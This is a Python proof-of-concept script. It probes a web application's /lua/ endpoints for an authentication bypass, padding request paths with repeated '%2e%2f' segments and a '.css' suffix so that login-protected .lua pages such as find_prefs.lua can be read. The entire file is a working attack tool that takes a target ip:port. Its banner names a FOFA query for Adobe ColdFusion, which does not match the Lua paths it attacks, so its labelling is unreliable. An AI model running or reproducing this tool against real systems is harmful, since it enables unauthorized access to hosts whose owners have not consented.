#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import re
import sys
import argparse
import requests

from requests.packages.urllib3.exceptions import InsecureRequestWarning


def title():
    print('+          FOFA:app="Adobe-ColdFusion"')


def get_base_length(url):
    session = requests.session()
    try:
        response = session.get(url=url, allow_redirects=False, timeout=(3,3))
        if not response.status_code == 302 and '/lua/login.lua' in response.headers.get('Location', ''):
            return -1
    except:
        return -1

    for i in range(90, 120):
        base_url = url + '/lua/' + '%2e%2f' * i + 'as_stats.lua.css'
        response = session.get(base_url, allow_redirects=False, timeout=(3, 3))
        if response.status_code < 300:
            return 255 - 1 - i * 2 - len('as_stats.lua')

    for i in range(90, 120):
        base_url = url + '/lua/' + '%2e%2f' * i + 'get_macs_data.lua.css'
        response = session.get(base_url, allow_redirects=False, timeout=(3, 3))
        if response.status_code < 300:
            return 255 - 1 - i * 2 - len('get_macs_data.lua')
    return -1


def get_padding_length(base_length, path):
    padding_length = 255 - 1 - base_length - len(path)
    if padding_length % 2 == 1:
        return -1

    return int(padding_length / 2)


def run_proto(url, file):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
    }

    get_len = int(get_base_length(url))
    pad_len = get_padding_length(get_len, file)
    check_url = url + "/lua/" + '%2e%2f' * pad_len + file + '.css'
    try:
        session = requests.session()
        session.get(url=url, headers=headers, allow_redirects=False, timeout=(3,3))
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = session.get(url=check_url, headers=headers, timeout=(3, 3), verify=False)
        reC = re.search(r'results.*?"(tab|name)".*?"(tab|name)".*.*?"(tab|name)".*?"(tab|name)".*?"(tab|name)"',
                        response.text, re.I)
        if reC:
            return True
        else:
            return False
    except Exception as e:
        print(e)
        return False


def run(tget, file):
    i = 0
    proto = ['http']
    while i < int(len(proto)):
        url = '{}://{}'.format(proto[i], tget)
        if run_proto(url, file):
            return True
        else:
            i = i + 1


if __name__ == '__main__':
    title()
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', help='ip:port')
    parser.add_argument('-f', '--file', help='unauthorized access filename', default='find_prefs.lua')
    args = parser.parse_args()
    target = args.url
    file = args.file
    result = run(target, file)

    if result:
        print('Exist')
    else:
        print('UnExist')